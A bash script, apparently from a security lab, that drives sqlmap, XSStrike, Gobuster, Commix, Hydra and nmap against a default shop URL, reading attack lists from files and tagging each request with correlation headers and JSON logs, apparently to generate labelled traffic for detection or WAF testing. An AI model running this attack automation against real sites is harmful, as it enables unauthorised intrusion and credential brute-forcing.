#!/bin/bash

# Comprehensive Attack Script for RAS Security Logs
# Supports multiple attack tools: sqlmap, xsstrike, gobuster, commix, hydra, nmap
# Format: type|tool|method|path|data|expected|waf_mode|description

# Generate unique log file name at script start
LOG_TIMESTAMP=$(date +%s)
LOG_PID=$$
LOG_FILENAME="attack_${LOG_TIMESTAMP}_${LOG_PID}.log"

# Redirect all output to log file with unique name
# We'll use a temporary name first, then rename it later
exec > >(tee /logs/${LOG_FILENAME}) 2>&1

set -e

# Global variables
TARGET="http://fancystore.com"
ATTACK_FILE=""  # Will be set by command line argument or based on attack type
START_LINE=""
END_LINE=""
SUCCESS_COUNT=0
FAILED_COUNT=0
EXECUTED_COUNT=0
ATTACK_TYPE="all"  # New: Attack type parameter
WAF_MODE="off"     # New: WAF mode parameter
DURATION=""        # Duration in seconds for repeated attacks

# Note: Attack execution order is deterministic (sequential)
# Random seed only affects benign traffic for reproducibility

# WAF mode filtering:
# - WAF_MODE=off: Execute only "block" attacks (normal attacks that should be blocked by WAF)
# - WAF_MODE=on: Execute only "bypass" attacks (WAF evasion techniques)
# - WAF_MODE=auto: Execute all attacks (for WAF detection)

# Get container IP for log correlation
CONTAINER_IP=$(hostname -i | awk '{print $1}')
echo "[INFO] Container IP: $CONTAINER_IP"

# JSON logging functions
log_json() {
    local level="$1"
    local message="$2"
    local additional_data="$3"
    
    # Create JSON structure
    json_data="{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"level\":\"$level\",\"message\":\"$message\",\"source\":\"attacker\",\"ip\":\"$CONTAINER_IP\""
    
    # Add additional data if provided
    if [[ -n "$additional_data" ]]; then
        json_data="$json_data,$additional_data"
    fi
    
    json_data="$json_data}"
    
    echo "$json_data"
}

log_attack_start() {
    local payload_id="$1"
    local attack_type="$2"
    local tool="$3"
    local description="$4"
    local method="$5"
    local path="$6"
    local data="$7"
    local expected="$8"
    local waf_mode="$9"
    
    local additional_data="\"payload_id\":\"$payload_id\",\"attack_type\":\"$attack_type\",\"tool\":\"$tool\",\"description\":\"$description\",\"method\":\"$method\",\"path\":\"$path\",\"data\":\"$data\",\"expected\":\"$expected\",\"waf_mode\":\"$waf_mode\",\"event_type\":\"attack_start\""
    
    log_json "INFO" "Attack started" "$additional_data"
}

log_attack_end() {
    local payload_id="$1"
    local result="$2"
    local http_code="$3"
    
    local additional_data="\"payload_id\":\"$payload_id\",\"result\":\"$result\",\"http_code\":\"$http_code\",\"event_type\":\"attack_end\""
    
    log_json "INFO" "Attack completed" "$additional_data"
}

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to generate attack headers for log correlation
generate_attack_headers() {
    local attack_type="$1"
    local payload_id="$2"
    local description="$3"
    
    # Generate unique identifiers
    export HTTP_X_ATTACK_ID="attack_$(date +%s)_${payload_id}"
    export HTTP_X_PAYLOAD_ID="payload_${payload_id}"
    export HTTP_X_ATTACK_TYPE="${attack_type}"
    export HTTP_X_TIMESTAMP="$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
    
    echo "  [INFO] Generated attack headers:"
    echo "    X-Attack-ID: $HTTP_X_ATTACK_ID"
    echo "    X-Payload-ID: $HTTP_X_PAYLOAD_ID"
    echo "    X-Attack-Type: $HTTP_X_ATTACK_TYPE"
    echo "    X-Timestamp: $HTTP_X_TIMESTAMP"
}

# Function to run SQL injection attacks with sqlmap
run_sqlmap() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "sql_injection" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using sqlmap for SQL injection testing..."
    
    # Check if sqlmap is available
    if ! command -v sqlmap &> /dev/null; then
        echo "  [ERROR] sqlmap is not available"
        echo "  [TOOL_STATUS] FAILED - sqlmap not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] sqlmap available, using professional tool"
    echo "  [TOOL_USED] sqlmap"
    
    mkdir -p /tmp/sqlmap_attack
    
    # Extract parameter from path or data
    if [[ "$path" == *"?"* ]]; then
        param=$(echo "$path" | sed 's/.*?\([^=]*\)=.*/\1/')
        sqlmap_url="$TARGET$path"
    else
        param="email"  # Default parameter for login
        sqlmap_url="$TARGET$path"
    fi
    
    # Run sqlmap with simplified, robust parameters
    echo "  [INFO] Running sqlmap against: $sqlmap_url"
    sqlmap_output=$(timeout 60 sqlmap \
        -u "$sqlmap_url" \
        ${data:+--data="$data"} \
        --batch --level=1 --risk=1 \
        --threads=1 --timeout=10 \
        --output-dir=/tmp/sqlmap_attack \
        --dump-format=json \
        --random-agent 2>&1 | tee /tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.txt)
    
    # Get actual HTTP status from curl test with attack headers
    http_code="000"
    if [[ "$method" == "POST" ]]; then
        curl_response=$(curl -s -w "%{http_code}" \
            -X "$method" \
            -H "User-Agent: attacker" \
            -H "Content-Type: application/json" \
            -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
            -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
            -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
            -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
            -d "$data" \
            --max-time 10 \
            "$TARGET$path")
        http_code=$(echo "$curl_response" | tail -c 4)
    fi
    
    # Check sqlmap output for injection detection
    injection_found=false
    if echo "$sqlmap_output" | grep -q "injectable\|vulnerable\|found"; then
        injection_found=true
    fi
    
    # Save sqlmap output as JSON for detection engine
    echo "$sqlmap_output" > "/tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.json"
    
    # Determine success based on HTTP status code (priority) and sqlmap detection
    if [ "$http_code" = "500" ] || [ "$injection_found" = true ]; then
        echo "  [SUCCESS] SQL injection detected (HTTP $http_code, sqlmap: $injection_found)"
        echo "  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.json"
        echo "  [TOOL_STATUS] SUCCESS - sqlmap completed"
        return 0
    else
        echo "  [FAILED] No SQL injection detected (HTTP $http_code, sqlmap: $injection_found)"
        echo "  [TOOL_STATUS] FAILED - No SQL injection indicators found"
        return 1
    fi
}

# Function to run XSS attacks with XSStrike
run_xsstrike() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "xss" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using XSStrike for XSS testing..."
    
    # Check if XSStrike is available
    if ! command -v xsstrike &> /dev/null; then
        echo "  [ERROR] XSStrike is not available"
        echo "  [TOOL_STATUS] FAILED - XSStrike not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] XSStrike available, using professional tool"
    echo "  [TOOL_USED] xsstrike"
    
    # Run XSStrike
    echo "  [INFO] Running XSStrike against: $TARGET$path"
    xsstrike_output=$(timeout 30 xsstrike \
        --url "$TARGET$path" \
        --crawl \
        --batch \
        --skip-dom \
        --blind \
        --skip \
        --skip-poc \
        --skip-waf \
        --threads 1 \
        2>&1)
    
    # Check XSStrike results
    xss_found=false
    if echo "$xsstrike_output" | grep -q "vulnerable\|found\|injectable\|reflected"; then
        xss_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save XSStrike output
    echo "$xsstrike_output" > "/tmp/xsstrike_output.txt"
    
    # Determine success
    if [ "$xss_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] XSS detected by XSStrike (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/xsstrike_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - XSStrike completed"
        return 0
    else
        echo "  [FAILED] No XSS detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No XSS indicators found"
        return 1
    fi
}

# Function to run directory traversal attacks with Gobuster
run_gobuster() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "traversal" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using Gobuster for directory traversal testing..."
    
    # Check if Gobuster is available
    if ! command -v gobuster &> /dev/null; then
        echo "  [ERROR] Gobuster is not available"
        echo "  [TOOL_STATUS] FAILED - Gobuster not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] Gobuster available, using professional tool"
    echo "  [TOOL_USED] gobuster"
    
    # Extract wordlist from data field
    wordlist=$(echo "$data" | sed 's/wordlist=//')
    
    # Create a simple wordlist for testing
    cat > /tmp/traversal_wordlist.txt << EOF
$wordlist
EOF
    
    # Run Gobuster
    echo "  [INFO] Running Gobuster against: $TARGET$path"
    gobuster_output=$(timeout 30 gobuster dir \
        -u "$TARGET$path" \
        -w /tmp/traversal_wordlist.txt \
        -t 1 \
        --timeout 10s \
        --no-error \
        2>&1)
    
    # Check Gobuster results
    traversal_found=false
    if echo "$gobuster_output" | grep -q "Status: 200\|Status: 403\|Status: 500"; then
        traversal_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Gobuster output
    echo "$gobuster_output" > "/tmp/gobuster_output.txt"
    
    # Determine success
    if [ "$traversal_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] Directory traversal detected by Gobuster (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/gobuster_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - Gobuster completed"
        return 0
    else
        echo "  [FAILED] No directory traversal detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No traversal indicators found"
        return 1
    fi
}

# Function to run command injection attacks with Commix
run_commix() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "command_injection" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using Commix for command injection testing..."
    
    # Check if Commix is available
    if ! command -v commix &> /dev/null; then
        echo "  [ERROR] Commix is not available"
        echo "  [TOOL_STATUS] FAILED - Commix not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] Commix available, using professional tool"
    echo "  [TOOL_USED] commix"
    
    # Run Commix
    echo "  [INFO] Running Commix against: $TARGET$path"
    commix_output=$(timeout 30 commix \
        --url "$TARGET$path" \
        --data "$data" \
        --batch \
        --skip-waf \
        --skip-heuristics \
        --skip-crawl \
        --threads 1 \
        --timeout 10 \
        2>&1)
    
    # Check Commix results
    cmd_injection_found=false
    if echo "$commix_output" | grep -q "injectable\|vulnerable\|found\|successful"; then
        cmd_injection_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        -d "$data" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Commix output
    echo "$commix_output" > "/tmp/commix_output.txt"
    
    # Determine success
    if [ "$cmd_injection_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] Command injection detected by Commix (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/commix_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - Commix completed"
        return 0
    else
        echo "  [FAILED] No command injection detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No command injection indicators found"
        return 1
    fi
}

# Function to run authentication bypass attacks with Hydra
run_hydra() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "auth_bypass" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using Hydra for authentication bypass testing..."
    
    # Check if Hydra is available
    if ! command -v hydra &> /dev/null; then
        echo "  [ERROR] Hydra is not available"
        echo "  [TOOL_STATUS] FAILED - Hydra not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] Hydra available, using professional tool"
    echo "  [TOOL_USED] hydra"
    
    # Extract userlist and passlist from data field
    userlist=$(echo "$data" | sed 's/userlist=\([^ ]*\).*/\1/')
    passlist=$(echo "$data" | sed 's/.*passlist=\([^ ]*\).*/\1/')
    
    # Create simple wordlists
    echo "$userlist" > /tmp/userlist.txt
    echo "$passlist" > /tmp/passlist.txt
    
    # Run Hydra
    echo "  [INFO] Running Hydra against: $TARGET$path"
    hydra_output=$(timeout 30 hydra \
        -L /tmp/userlist.txt \
        -P /tmp/passlist.txt \
        -f \
        "$TARGET" \
        http-post-form \
        "$path:email=^USER^&password=^PASS^:Invalid credentials" \
        2>&1)
    
    # Check Hydra results
    auth_bypass_found=false
    if echo "$hydra_output" | grep -q "1 valid password found\|login successful"; then
        auth_bypass_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        -d "{\"email\":\"$userlist\",\"password\":\"$passlist\"}" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Hydra output
    echo "$hydra_output" > "/tmp/hydra_output.txt"
    
    # Determine success
    if [ "$auth_bypass_found" = true ] || [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        echo "  [SUCCESS] Authentication bypass detected by Hydra (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/hydra_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - Hydra completed"
        return 0
    else
        echo "  [FAILED] No authentication bypass detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No authentication bypass indicators found"
        return 1
    fi
}

# Function to run file discovery attacks with Gobuster
run_file_discovery() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "file_discovery" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using Gobuster for file discovery testing..."
    
    # Check if Gobuster is available
    if ! command -v gobuster &> /dev/null; then
        echo "  [ERROR] Gobuster is not available"
        echo "  [TOOL_STATUS] FAILED - Gobuster not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] Gobuster available, using professional tool"
    echo "  [TOOL_USED] gobuster"
    
    # Extract wordlist from data field
    wordlist=$(echo "$data" | sed 's/wordlist=//')
    
    # Create a wordlist for sensitive files
    echo "$wordlist" > /tmp/file_wordlist.txt
    
    # Run Gobuster
    echo "  [INFO] Running Gobuster against: $TARGET$path"
    gobuster_output=$(timeout 30 gobuster dir \
        -u "$TARGET$path" \
        -w /tmp/file_wordlist.txt \
        -t 1 \
        --timeout 10s \
        --no-error \
        2>&1)
    
    # Check Gobuster results
    file_found=false
    if echo "$gobuster_output" | grep -q "Status: 200\|Status: 403\|Status: 500"; then
        file_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Gobuster output
    echo "$gobuster_output" > "/tmp/gobuster_file_output.txt"
    
    # Determine success
    if [ "$file_found" = true ] || [ "$http_code" = "200" ]; then
        echo "  [SUCCESS] Sensitive file detected by Gobuster (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - Gobuster completed"
        return 0
    else
        echo "  [FAILED] No sensitive file detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No sensitive file indicators found"
        return 1
    fi
}

# Function to run HTTP method enumeration with Nmap
run_nmap() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    local payload_id="$6"
    
    # Generate attack headers
    generate_attack_headers "http_method_enum" "$payload_id" "$description"
    
    echo "  [REAL ATTACK] Using Nmap for HTTP method enumeration testing..."
    
    # Check if Nmap is available
    if ! command -v nmap &> /dev/null; then
        echo "  [ERROR] Nmap is not available"
        echo "  [TOOL_STATUS] FAILED - Nmap not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    # Check if curl is available for HTTP status verification
    if ! command -v curl &> /dev/null; then
        echo "  [ERROR] curl is not available for HTTP status verification"
        echo "  [TOOL_STATUS] FAILED - curl not found"
        echo "  [FALLBACK_STATUS] NOT_AVAILABLE - No fallback mechanism"
        return 1
    fi
    
    echo "  [INFO] Nmap available, using professional tool"
    echo "  [TOOL_USED] nmap"
    
    # Extract host from URL
    TARGET_HOST=$(echo "$TARGET" | sed 's|^https*://||' | sed 's|/.*$||')
    
    # Extract nmap arguments from method field
    nmap_args=$(echo "$method" | sed 's/nmap|//')
    
    # Run Nmap HTTP methods script
    echo "  [INFO] Running Nmap against: $TARGET_HOST"
    nmap_output=$(timeout 30 nmap $nmap_args "$TARGET_HOST" 2>&1)
    
    # Check Nmap results
    method_found=false
    if echo "$nmap_output" | grep -q "PUT\|DELETE\|HEAD\|OPTIONS\|TRACE\|PATCH"; then
        method_found=true
    fi
    
    # Also test with curl for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "OPTIONS" \
        -H "User-Agent: attacker" \
        -H "X-Attack-ID: $HTTP_X_ATTACK_ID" \
        -H "X-Payload-ID: $HTTP_X_PAYLOAD_ID" \
        -H "X-Attack-Type: $HTTP_X_ATTACK_TYPE" \
        -H "X-Timestamp: $HTTP_X_TIMESTAMP" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Nmap output
    echo "$nmap_output" > "/tmp/nmap_output.txt"
    
    # Determine success
    if [ "$method_found" = true ] || [ "$http_code" != "405" ]; then
        echo "  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/nmap_output.txt"
        echo "  [TOOL_STATUS] SUCCESS - Nmap completed"
        return 0
    else
        echo "  [FAILED] No unusual HTTP methods detected (HTTP $http_code)"
        echo "  [TOOL_STATUS] FAILED - No unusual HTTP methods found"
        return 1
    fi
}

# Main attack execution function
execute_attacks_once() {
    echo "[*] ========================================"
    echo "[*] COMPREHENSIVE ATTACK EXECUTION"
    echo "[*] ========================================"
    echo "[*] Executing attacks from attack file..."
    echo "[START] Executing attacks from file at $(date)"
    echo "[*] Attack file: $ATTACK_FILE"
    
    # Count total lines and payloads
    total_lines=$(wc -l < "$ATTACK_FILE")
    total_payloads=$(grep -v "^#" "$ATTACK_FILE" | grep -v "^$" | wc -l)
    echo "[*] Total lines in attack file: $total_lines"
    echo "[*] Total attack payloads: $total_payloads"
    
    if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
        echo "[*] Executing payloads $START_LINE to $END_LINE (out of $total_payloads total payloads)"
    else
        echo "[*] Executing all payloads"
    fi
    
    # Read attack file line by line
    line_num=0
    payload_count=0
    
    while IFS='|' read -r attack_type tool method path data expected waf_mode description; do
        line_num=$((line_num + 1))
        
        # Skip comments and empty lines
        # Comments can start with # or be empty lines
        if [[ "$attack_type" =~ ^[[:space:]]*#.*$ ]] || [[ "$attack_type" =~ ^[[:space:]]*$ ]] || [[ -z "$attack_type" ]]; then
            continue
        fi
        
        # Debug: Print parsed fields
        echo "[DEBUG] Line $line_num: attack_type='$attack_type', waf_mode='$waf_mode', WAF_MODE='$WAF_MODE'"
        
        # Map attack types to handle different naming conventions
        mapped_attack_type="$attack_type"
        case "$attack_type" in
            "auth_bypass")
                mapped_attack_type="authentication_bypass"
                ;;
            "cmd_injection")
                mapped_attack_type="command_injection"
                ;;
            "traversal")
                mapped_attack_type="directory_traversal"
                ;;
            "method_enum")
                mapped_attack_type="http_method_enum"
                ;;
        esac
        
        # New: Filter attacks based on ATTACK_TYPE (use command line argument, not environment variable)
        if [[ "$ATTACK_TYPE" != "all" && "$mapped_attack_type" != "$ATTACK_TYPE" ]]; then
            echo "[DEBUG] Skipping attack: ATTACK_TYPE='$ATTACK_TYPE', attack_type='$attack_type', mapped='$mapped_attack_type' (type mismatch)"
            continue
        fi
        
        # Execute all attacks (WAF filtering disabled)
        echo "[DEBUG] Executing attack: attack_type='$mapped_attack_type', waf_mode='$waf_mode'"
        
        # Count this as a valid payload
        payload_count=$((payload_count + 1))
        echo "[DEBUG] Valid payload found: payload_count=$payload_count, START_LINE=$START_LINE, END_LINE=$END_LINE"
        
        # Check if we're in the specified range (based on payload count, not line number)
        # If no range is specified, execute all payloads
        if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
            if [[ $payload_count -lt $START_LINE ]] || [[ $payload_count -gt $END_LINE ]]; then
                echo "[DEBUG] Skipping payload $payload_count: outside range [$START_LINE-$END_LINE]"
                continue
            fi
        else
            # No range specified, execute all payloads
            echo "[DEBUG] No range specified, executing all payloads"
        fi
        
        # Print attack start marker with WAF mode info
        echo "[INFO] WAF Mode: $WAF_MODE, Attack WAF Type: $waf_mode"
        log_attack_start "$payload_count" "$attack_type" "$tool" "$description" "$method" "$path" "$data" "$expected" "$waf_mode"
        
        # Execute the attack based on tool
        case "$tool" in
            "sqlmap")
                if run_sqlmap "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    result="SUCCESS"
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                    result="FAILED"
                fi
                ;;
            "xsstrike")
                if run_xsstrike "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    result="SUCCESS"
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                    result="FAILED"
                fi
                ;;
            "gobuster")
                if [[ "$attack_type" == "traversal" ]]; then
                    if run_gobuster "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                        result="SUCCESS"
                    else
                        FAILED_COUNT=$((FAILED_COUNT + 1))
                        result="FAILED"
                    fi
                elif [[ "$attack_type" == "file_discovery" ]]; then
                    if run_file_discovery "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                        result="SUCCESS"
                    else
                        FAILED_COUNT=$((FAILED_COUNT + 1))
                        result="FAILED"
                    fi
                fi
                ;;
            "commix")
                if run_commix "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    result="SUCCESS"
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                    result="FAILED"
                fi
                ;;
            "hydra")
                if run_hydra "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    result="SUCCESS"
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                    result="FAILED"
                fi
                ;;
            "nmap")
                if run_nmap "$method" "$path" "$data" "$expected" "$description" "$payload_count"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    result="SUCCESS"
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                    result="FAILED"
                fi
                ;;
            *)
                echo "[WARNING] Unknown tool: $tool"
                FAILED_COUNT=$((FAILED_COUNT + 1))
                result="FAILED"
                ;;
        esac
        
        EXECUTED_COUNT=$((EXECUTED_COUNT + 1))
        
        # Add attack end marker for structured parsing
        log_attack_end "$payload_count" "$result" "$http_code"
        
        # Small delay between attacks
        sleep 1
        
    done < "$ATTACK_FILE"
    
    echo "[DONE] Executed $EXECUTED_COUNT attacks from file at $(date)"
    echo "[*] Success: $SUCCESS_COUNT, Failed: $FAILED_COUNT"
    echo "[*] Attack file execution completed"
}

# Parse command line arguments
while [ $# -gt 0 ]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --start)
      START_LINE="$2"
      shift 2
      ;;
    --end)
      END_LINE="$2"
      shift 2
      ;;
    --attack-file)
      ATTACK_FILE="$2"
      shift 2
      ;;
    --attack-type)
      ATTACK_TYPE="$2"
      shift 2
      ;;
    --waf-mode)
      WAF_MODE="$2"
      shift 2
      ;;
    --duration)
      DURATION="$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [OPTIONS]"
      echo ""
      echo "Options:"
      echo "  --target URL        Target URL (default: http://fancystore.com)"
      echo "  --start LINE        Start line number for attack execution"
      echo "  --end LINE          End line number for attack execution"
      echo "  --attack-file FILE  Attack scenarios file (default: /opt/scripts/attacks.txt)"
      echo "  --attack-type TYPE  Attack type: sql_injection, xss, directory_traversal, all (default: all)"
      echo "  --waf-mode MODE     WAF mode: on, off, auto (default: off)"
      echo "  --help              Show this help"
      echo ""
      echo "Examples:"
      echo "  $0 --target http://example.com"
      echo "  $0 --start 10 --end 20"
      echo "  $0 --attack-file /path/to/attacks.txt"
      echo "  $0 --attack-type sql_injection --waf-mode on"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      echo "Use --help for usage information"
      exit 1
      ;;
  esac
done

# Set attack file based on attack type if not specified via --attack-file
if [[ -z "$ATTACK_FILE" ]]; then
    case "$ATTACK_TYPE" in
        "sql_injection")
            ATTACK_FILE="/scripts/attacks/sql_inj.txt"
            ;;
        "xss")
            ATTACK_FILE="/scripts/attacks/xss.txt"
            ;;
        "directory_traversal")
            ATTACK_FILE="/scripts/attacks/directory_traversal.txt"
            ;;
        "command_injection")
            ATTACK_FILE="/scripts/attacks/command_inj.txt"
            ;;
        "authentication_bypass")
            ATTACK_FILE="/scripts/attacks/auth_bypass.txt"
            ;;
        "file_discovery")
            ATTACK_FILE="/scripts/attacks/file_discovery.txt"
            ;;
        "http_method_enum")
            ATTACK_FILE="/scripts/attacks/method_enum.txt"
            ;;
        *)
            echo "[WARNING] Unknown attack type: $ATTACK_TYPE, using default"
            ATTACK_FILE="/scripts/attacks/sql_inj.txt"
            ;;
    esac
fi

# Main execution
echo "[*] Attacking target: $TARGET"
